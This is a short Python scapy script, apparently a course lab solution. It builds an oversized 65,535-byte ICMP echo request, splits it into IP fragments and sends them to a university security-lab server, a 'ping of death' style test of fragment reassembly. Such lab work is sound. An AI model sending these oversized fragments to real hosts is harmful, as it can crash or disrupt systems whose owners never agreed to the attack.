from scapy.all import *
import sys
import socket

PORT = int(sys.argv[1])

def readn(s, n):
	buf = b''
	while len(buf) < n:
		buf += s.recv(n - len(buf))

	return buf

def fragment(pkt, fragsize):
    # fragsize is 1480
    fragsize = 1480#(fragsize + 7) // 8 * 8
    lst = []
    for p in pkt:
        s = raw(p[IP].payload)
        nb = (len(s) + fragsize - 1) // fragsize
        for i in range(nb):
            q = p.copy()
            del(q[IP].payload)
            del(q[IP].chksum)
            del(q[IP].len)
            if i != nb - 1:
                q[IP].flags = 1
            q[IP].frag += i * fragsize // 8          
            r = conf.raw_layer(load=s[i * fragsize:(i + 1) * fragsize])
            r.overload_fields = p[IP].payload.overload_fields.copy()
            q.add_payload(r)
            lst.append(q)
    return lst

def sendfragment(s, pkt_data):
	l = fragment(pkt_data, 1480)
	for e in l:
		tmp = raw(e)
		s.sendall(struct.pack(">H", len(tmp)))
		
		s.sendall(tmp)
		
		# response = sr1(ip_layer / icmp_layer)





# ip_layer = Raw(b'hi')
ip_layer = IP(src="192.168.222.1", dst="192.168.222.2")
icmp_layer = ICMP(type=8, code=0)

payload = Raw("H"*65535)
# pkt = ip_layer / Raw(b'asdfg')

ip_layer.show()
icmp_layer.show()

pkt = ip_layer / icmp_layer / payload
pkt.show()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.connect(("cs177.seclab.cs.ucsb.edu", PORT))


sendfragment(s,pkt)
# s.sendall(struct.pack(">H", len(pkt_data)))
# s.sendall(pkt_data)

while True:
	length = struct.unpack(">H", readn(s, 2))[0]
	data = readn(s, length)
	print("server response: ",data)
	IP(data).show()
	# response = sr1(ip_layer / icmp_layer)
	





